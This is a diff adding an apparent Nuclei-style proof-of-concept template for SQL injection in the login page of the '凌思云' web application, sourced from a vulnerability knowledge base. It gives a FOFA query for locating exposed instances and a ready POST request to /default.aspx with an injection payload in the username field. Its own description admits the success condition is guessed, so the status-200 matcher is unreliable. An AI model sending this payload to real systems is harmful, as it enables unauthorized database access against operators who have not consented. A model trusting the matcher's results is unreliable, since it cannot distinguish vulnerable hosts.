@@ -1,0 +1,46 @@
+id: poc-eldum8p3nwwfy05x
+info:
+  name: 凌思云-login-sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eldum8p3nwwfy05x
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eldum8p3nwwfy05x
+    fofa: body="js/AllPageFunction.js"
+http:
+- raw:
+  - 'GET /default.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+
+
+    2.将上面获取的VIEWSTATE值最好url编码后，传入以下请求包{{VIEWSTATE}}处'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /default.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+
+    Content-Type:application/x-www-form-urlencoded
+
+    X-Ext.Net: delta=true
+
+
+    hidLanguages=&__EVENTTARGET=ResourceManager1&__EVENTARGUMENT=-%7Cpublic%7CbtnBeforeLogin_Click&__VIEWSTATE=/wEPDwUJMzc0ODA5MTAxD2QWAgIDD2QWEAIBD2QWAmYPFgIeBWNsYXNzBQh4LWhpZGRlbmQCBQ9kFgJmDxYCHwAFCHgtaGlkZGVuZAIHD2QWAmYPFgIfAAUIeC1oaWRkZW5kAgkPZBYCZg8WAh8ABQh4LWhpZGRlbmQCCw9kFgJmDxYCHwAFCHgtaGlkZGVuZAIND2QWAmYPFgIfAAUIeC1oaWRkZW5kAg8PZBYCZg8WAh8ABQh4LWhpZGRlbmQCEQ9kFgJmDxYCHwAFCHgtaGlkZGVuZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WCQUJaGRpc2xvZ2luBRBSZXNvdXJjZU1hbmFnZXIxBQt0eHRVc2VyTmFtZQULdHh0UGFzc1dvcmQFCGJ0bkxvZ2luBQhidG5DbGVhcgUJYnRuTG9naW4xBQlidG5DbGVhcjEFBXRlc3QxerIFrl8Vo5ljeYFAZd06RUn1Sj90Csv0DtP9CyhRbO0=&__VIEWSTATEGENERATOR=&__EVENTVALIDATION=&hdislogin=&txtUserName=a'' and 1=user--&txtPassWord=admin&test1=Yes'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
